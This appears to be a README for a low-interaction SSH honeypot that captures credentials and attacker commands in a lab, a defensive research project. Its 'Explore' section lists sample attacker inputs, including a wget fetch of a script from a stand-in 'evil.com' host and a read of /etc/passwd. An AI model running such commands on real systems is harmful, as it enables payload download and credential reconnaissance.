# SSH Honeypot (Low Interaction)

## Overview
This is a low-interaction SSH honeypot designed for educational and research purposes. It emulates a basic Linux server to capture credentials, command attempts, and attacker behavior in a controlled environment.

**⚠️ WARNING: LAB USE ONLY. Do not deploy on production networks without isolation.**

## Features
- **SSH Emulation**: Uses `paramiko` to accept connections.
- **Credential Capture**: Logs username/passwords used for login.
- **Shell Simulation**: Emulates meaningful responses for `ls`, `pwd`, `uname`, `whoami`, etc.
- **Logging**:
  - `events.jsonl`: Raw event stream (connecting, commands).
  - `honeypot.db` (SQLite): Structured storage for sessions and commands.
- **MITRE ATT&CK Mapping**: Basic tagging of commands to TTPs (e.g., Discovery, Credential Dumping).

## Directory Structure
```
.
├── analysis/       # TTP tagging logic
├── config/         # Settings (port, banners)
├── honeypot/       # Server and Shell simulation
├── storage/        # Database and JSONL logging
├── tests/          # Unit tests
├── Dockerfile
├── docker-compose.yml
├── events.jsonl    # (Generated) Log file
├── honeypot.db     # (Generated) SQLite DB
└── run_lab.sh      # Startup script
```

## Installation & Usage

### Prerequisites
- Docker & Docker Compose
- Python 3.9+ (for local testing)

### Quick Start (Docker)
1. **Run the Lab Script**:
   ```bash
   chmod +x run_lab.sh
   ./run_lab.sh
   ```
   Or manually:
   ```bash
   docker-compose up -d --build
   ```

2. **Simulate an Attack**:
   Open a new terminal and connect:
   ```bash
   ssh root@localhost -p 2222
   # Password: any (e.g., admin)
   ```

3. **Explore**:
   Try commands like:
   ```bash
   ls
   whoami
   cat /etc/passwd
   wget http://evil.com/malware.sh
   ```

### Check Logs
**Structured Data (SQLite)**:
Use any SQLite viewer or basic query:
```bash
sqlite3 honeypot.db "SELECT * FROM sessions;"
sqlite3 honeypot.db "SELECT * FROM commands;"
```

**Raw Events (JSONL)**:
```bash
cat events.jsonl
```

## Design Details
- **Simulator**: `honeypot/shell.py` handles the logic. It does NOT execute commands on the host. It matches strings matching known commands and returns static or dynamic fake responses.
- **Security**: The container runs as root inside, but is isolated from the host. Rate limiting is recommended at the firewall level (outside scope of this python script, but Docker helps isolate).
- **Sanitization**: Passwords are logged for analysis (it's a honeypot!), ensure log files are protected.

## Limitations
- It's low-interaction: Complex scripts requiring dependencies (gcc, python, perl) won't run.
- `scp` and `sftp` are not fully supported.
- Experienced attackers will fingerprint it easily as a honeypot.
